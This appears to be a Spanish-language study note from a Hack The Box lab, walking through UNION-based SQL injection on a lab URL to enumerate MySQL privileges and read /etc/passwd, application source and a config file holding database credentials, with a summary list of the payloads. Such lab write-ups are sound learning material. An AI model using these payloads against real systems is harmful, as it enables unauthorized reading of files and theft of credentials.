
---
- Tags: #vulnerabilidad #web 
---
# 📘 Guía práctica: SQL Injection para enumeración y lectura de archivos (HTB)

## 🧠 Introducción

Esta guía documenta el proceso de explotación de una **inyección SQL** ([[SQLi]]) para:

- Confirmar la vulnerabilidad.
- Enumerar permisos del usuario `root` en MySQL.
- Leer archivos del sistema como `/etc/passwd`, `search.php` y `config.php`.
- Encontrar credenciales sensibles.

Todas las pruebas se realizaron en la URL:

```

[http://83.136.255.10:58278/search.php?port_code=](http://83.136.255.10:58278/search.php?port_code=)

````

---

## 1. ✅ Confirmación de la vulnerabilidad

**Acción:**

Comprobamos que el parámetro `port_code` es vulnerable inyectando un [[UNION SELECT]].

```sql
' UNION SELECT 1,2,3,4-- -
````

**Explicación:**

Si la inyección tiene éxito, la página mostrará los valores `2`, `3` y `4` en la tabla. Esto confirma que:

- La aplicación concatena directamente el valor en una consulta SQL.
    
- El número de columnas es 4.
    
- Podemos continuar con otras inyecciones más complejas.
    

---

## 2. 🔐 Comprobar privilegios del usuario `root` en MySQL

### 2.1. Comprobar si tiene el privilegio `SUPER`

```sql
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

**Explicación:**

- `super_priv` = 'Y' indica que el usuario puede realizar acciones avanzadas en MySQL.
    
- Esto puede incluir cargar archivos o modificar configuraciones.
    

---

### 2.2. Enumerar todos los privilegios de `root@localhost`

```sql
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

**Explicación:**

Esta consulta muestra todos los privilegios otorgados explícitamente a `root@localhost`, por ejemplo:

```
SELECT, INSERT, UPDATE, FILE, CREATE
```

Si el usuario tiene `FILE`, puedes leer archivos con `LOAD_FILE()`.

---

## 3. 📂 Leer archivos del sistema con `LOAD_FILE()`

### 3.1. Leer `/etc/passwd`

```sql
' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

**Explicación:**

Nos permite confirmar acceso al sistema de archivos. Muestra usuarios del sistema Linux.

---

### 3.2. Leer el archivo fuente `search.php`

```sql
' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

**Explicación:**

Este archivo es la propia aplicación vulnerable. Puede revelar:

- Cómo se construye la query SQL.
    
- Si hay includes/requires a otros archivos.
    

---

### 3.3. Leer `config.php` para obtener credenciales

```sql
' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

**Explicación:**

Este archivo suele contener las **credenciales de conexión a MySQL**, como:

```php
$db_user = "root";
$db_pass = "toor123";
```

Esto te permite conectarte directamente a la base de datos desde consola o herramientas como `sqlmap`.

---

## 🧪 Otras queries útiles para SQLi (bonus)

### Obtener versión de MySQL

```sql
' UNION SELECT 1, @@version, 3, 4-- -
```

### Listar todas las bases de datos

```sql
' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata-- -
```

### Listar tablas de una base de datos

```sql
' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema='nombre_base_datos'-- -
```

### Listar columnas de una tabla

```sql
' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='nombre_tabla'-- -
```

### Extraer usuarios de una tabla `users`

```sql
' UNION SELECT 1, username, password, 4 FROM users-- -
```

---

## 🧾 Resumen de payloads usados

```sql
1. ' UNION SELECT 1,2,3,4-- -
2. ' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
3. ' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
4. ' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
5. ' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
6. ' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -
```

---

## 🧠 Conclusión

Este tipo de explotación SQLi permite:

- Confirmar la vulnerabilidad.
    
- Enumerar privilegios y configuraciones internas.
    
- Robar archivos del sistema.
    
- Escalar a control completo de la base de datos.
    

Una vez que obtienes credenciales, puedes avanzar hacia una **conexión directa**, pivotar o buscar vulnerabilidades adicionales.

---
